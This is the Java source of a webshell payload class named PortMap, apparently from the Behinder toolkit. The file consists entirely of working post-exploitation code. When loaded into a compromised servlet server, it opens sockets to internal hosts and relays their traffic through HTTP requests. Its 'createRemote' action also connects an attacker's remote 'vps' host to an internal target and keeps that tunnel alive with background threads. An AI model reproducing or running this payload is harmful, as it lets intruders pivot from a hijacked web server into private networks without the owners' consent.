package net.rebeyond.behinder.payload.java;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;

public class PortMap implements Runnable {
    public static String action;
    public static String targetIP;
    public static String targetPort;
    public static String socketHash;
    public static String remoteIP;
    public static String remotePort;
    public static String extraData;
    String localKey;
    String remoteKey;
    String type;
    HttpSession httpSession;
    private HttpServletRequest Request;
    private HttpServletResponse Response;
    private HttpSession Session;

    public PortMap(String localKey, String remoteKey, String type, HttpSession session) {
        this.localKey = localKey;
        this.remoteKey = remoteKey;
        this.httpSession = session;
        this.type = type;
    }

    public PortMap() {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = (HttpServletResponse) page.getResponse();
        this.Request = (HttpServletRequest) page.getRequest();

        try {
            this.portMap(page);
        } catch (Exception var4) {
        }

        return true;
    }

    public void portMap(PageContext page) throws Exception {
        String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
        SocketChannel socketChannel;
        if (action.equals("createLocal")) {
            try {
                String target = targetIP;
                int port = Integer.parseInt(targetPort);
                socketChannel = SocketChannel.open();
                socketChannel.connect(new InetSocketAddress(target, port));
                socketChannel.configureBlocking(false);
                this.Session.setAttribute(localSessionKey, socketChannel);
                this.Response.setStatus(200);
            } catch (Exception var21) {
                Exception e = var21;
                var21.printStackTrace();
                ServletOutputStream so = null;

                try {
                    so = this.Response.getOutputStream();
                    so.write(new byte[]{55, 33, 73, 54});
                    so.write(e.getMessage().getBytes());
                    so.flush();
                    so.close();
                } catch (IOException var20) {
                    var20.printStackTrace();
                }
            }
        } else {
            Exception e;
            ServletOutputStream so;
            int port;
            switch (action) {
                case "read":
                    socketChannel = (SocketChannel) this.Session.getAttribute(localSessionKey);

                    try {
                        ByteBuffer buf = ByteBuffer.allocate(512);
                        socketChannel.configureBlocking(false);
                        port = socketChannel.read(buf);
                        for (so = this.Response.getOutputStream(); port > 0; port = socketChannel.read(buf)) {
                            so.write(buf.array(), 0, port);
                            so.flush();
                            buf.clear();
                        }

                        so.flush();
                        so.close();
                    } catch (Exception var24) {
                        e = var24;
                        var24.printStackTrace();
                        this.Response.setStatus(200);
                        socketChannel = null;

                        try {
                            so = this.Response.getOutputStream();
                            so.write(new byte[]{55, 33, 73, 54});
                            so.write(e.getMessage().getBytes());
                            so.flush();
                            so.close();
                            socketChannel.socket().close();
                        } catch (IOException var19) {
                            var19.printStackTrace();
                        }
                    }
                    break;
                case "write":
                    socketChannel = (SocketChannel) this.Session.getAttribute(localSessionKey);

                    try {
                        byte[] extraDataByte = (new BASE64Decoder()).decodeBuffer(extraData);
                        ByteBuffer buf = ByteBuffer.allocate(extraDataByte.length);
                        buf.clear();
                        buf.put(extraDataByte);
                        buf.flip();

                        while (buf.hasRemaining()) {
                            socketChannel.write(buf);
                        }
                    } catch (Exception var23) {
                        e = var23;
                        socketChannel = null;

                        try {
                            so = this.Response.getOutputStream();
                            so.write(new byte[]{55, 33, 73, 54});
                            so.write(e.getMessage().getBytes());
                            so.flush();
                            so.close();
                            socketChannel.socket().close();
                        } catch (IOException var18) {
                            var18.printStackTrace();
                        }
                    }
                    break;
                default:
                    Enumeration<String> attributeNames;
                    String attrName;
                    switch (action) {
                        case "closeLocal":
                            try {
                                attributeNames = this.Session.getAttributeNames();

                                while (attributeNames.hasMoreElements()) {
                                    attrName = attributeNames.nextElement().toString();
                                    if (attrName.startsWith("local_" + targetIP + "_" + targetPort)) {
                                        socketChannel = (SocketChannel) this.Session.getAttribute(attrName);
                                        socketChannel.close();
                                        this.Session.removeAttribute(attrName);
                                    }
                                }
                            } catch (IOException var22) {
                                var22.printStackTrace();
                            }
                            break;
                        case "createRemote": {
                            List<Thread> workList = new ArrayList<>();
                            this.Session.setAttribute("remote_portmap_workers", workList);

                            try {
                                attrName = targetIP;
                                port = Integer.parseInt(targetPort);
                                String vps = remoteIP;
                                int vpsPort = Integer.parseInt(remotePort);
                                SocketChannel localSocketChannel = SocketChannel.open();
                                localSocketChannel.connect(new InetSocketAddress(attrName, port));
                                String localKey = "remote_local_" + localSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                                this.Session.setAttribute(localKey, localSocketChannel);
                                SocketChannel remoteSocketChannel = SocketChannel.open();
                                remoteSocketChannel.connect(new InetSocketAddress(vps, vpsPort));
                                String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                                this.Session.setAttribute(remoteKey, remoteSocketChannel);
                                Thread reader = new Thread(new PortMap(localKey, remoteKey, "read", this.Session));
                                Thread writer = new Thread(new PortMap(localKey, remoteKey, "write", this.Session));
                                Thread keeper = new Thread(new PortMap(localKey, remoteKey, "keepAlive", this.Session));
                                reader.start();
                                writer.start();
                                keeper.start();
                                workList.add(reader);
                                workList.add(writer);
                                workList.add(keeper);
                                this.Response.setStatus(200);
                            } catch (Exception var17) {
                                e = var17;
                                var17.printStackTrace();
                                try {
                                    so = this.Response.getOutputStream();
                                    so.write(new byte[]{55, 33, 73, 54});
                                    so.write(e.getMessage().getBytes());
                                    so.flush();
                                    so.close();
                                } catch (IOException var16) {
                                    var16.printStackTrace();
                                }
                            }
                            break;
                        }
                        case "closeRemote": {
                            attributeNames = this.Session.getAttributeNames();

                            while (attributeNames.hasMoreElements()) {
                                attrName = attributeNames.nextElement();
                                if (attrName.startsWith("remote_") && attrName.endsWith(targetIP + "_" + targetPort)) {
                                    socketChannel = (SocketChannel) this.Session.getAttribute(attrName);

                                    try {
                                        socketChannel.close();
                                    } catch (Exception var15) {
                                    }

                                    this.Session.removeAttribute(attrName);
                                }
                            }

                            List<Thread> workList = (List<Thread>) this.Session.getAttribute("remote_portmap_workers");

                            for (Thread o : workList) {
                                o.interrupt();
                            }
                            break;
                        }
                    }
                    break;
            }
        }

    }

    public void run() {
        int vpsPort;
        SocketChannel localSocketChannel;
        SocketChannel remoteSocketChannel;
        ByteBuffer buf;
        OutputStream so;
        if (this.type.equals("read")) {
            while (true) {
                try {
                    localSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.localKey);
                    remoteSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.remoteKey);
                    buf = ByteBuffer.allocate(512);
                    vpsPort = localSocketChannel.read(buf);

                    for (so = remoteSocketChannel.socket().getOutputStream(); vpsPort > 0; vpsPort = localSocketChannel.read(buf)) {
                        so.write(buf.array(), 0, vpsPort);
                        so.flush();
                        buf.clear();
                    }

                    so.flush();
                    so.close();
                } catch (IOException var11) {
                    try {
                        Thread.sleep(5000L);
                    } catch (Exception var7) {
                    }
                }
            }
        }

        if (this.type.equals("write")) {
            while (true) {
                try {
                    localSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.localKey);
                    remoteSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.remoteKey);
                    buf = ByteBuffer.allocate(512);
                    vpsPort = remoteSocketChannel.read(buf);

                    for (so = localSocketChannel.socket().getOutputStream(); vpsPort > 0; vpsPort = remoteSocketChannel.read(buf)) {
                        so.write(buf.array(), 0, vpsPort);
                        so.flush();
                        buf.clear();
                    }

                    so.flush();
                    so.close();
                } catch (IOException var12) {
                    try {
                        Thread.sleep(5000L);
                    } catch (Exception var8) {
                    }
                }
            }
        }

        if (this.type.equals("keepAlive")) {
            String target = targetIP;
            int port = Integer.parseInt(targetPort);
            String vps = remoteIP;
            vpsPort = Integer.parseInt(remotePort);

            while (true) {
                localSocketChannel = (SocketChannel) this.httpSession.getAttribute(this.localKey);
                if (!localSocketChannel.isConnected()) {
                    try {
                        localSocketChannel = SocketChannel.open();
                        this.httpSession.setAttribute(this.localKey, localSocketChannel);
                        localSocketChannel.connect(new InetSocketAddress(target, port));
                        remoteSocketChannel = SocketChannel.open();
                        this.httpSession.setAttribute(this.remoteKey, remoteSocketChannel);
                        remoteSocketChannel.connect(new InetSocketAddress(vps, vpsPort));
                    } catch (IOException var9) {
                        var9.printStackTrace();
                    }
                }

                try {
                    Thread.sleep(5000L);
                } catch (Exception var10) {
                    var10.printStackTrace();
                }
            }
        }

    }
}
